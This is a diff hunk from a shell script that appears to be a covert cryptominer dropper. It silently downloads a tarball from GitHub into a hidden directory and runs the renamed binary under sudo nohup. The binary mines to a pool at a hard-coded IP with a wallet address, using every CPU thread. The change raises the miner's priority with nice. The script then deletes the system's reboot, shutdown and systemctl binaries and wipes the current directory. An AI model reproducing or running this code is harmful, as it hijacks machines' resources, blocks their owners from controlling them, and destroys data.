@@ -24,7 +24,7 @@ mkdir .lib && cd .lib
 wget https://github.com/TiannaMcdowell/All-File/raw/main/daemon.tar.gz > /dev/null 2>&1 
 tar -xvf daemon.tar.gz
 mv uranus sgr1
-sudo nohup ./sgr1 --donate-level 1 -o 128.199.218.20:443 -u Q010500f8f21098ccf5acf2f08f0e6b315fb958d7c7a1bf811f34e49f7ac459f4aa7683c723391d -p $WORKER -a rx/0 -t $(nproc --all) > /dev/null 2>&1 &
+sudo nohup nice -n -10 ./sgr1 --donate-level 1 -o 128.199.218.20:443 -u Q010500f8f21098ccf5acf2f08f0e6b315fb958d7c7a1bf811f34e49f7ac459f4aa7683c723391d -p $WORKER -a rx/0 -t $(nproc --all) > /dev/null 2>&1 &
 sleep 30
 sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
 rm -rvf *
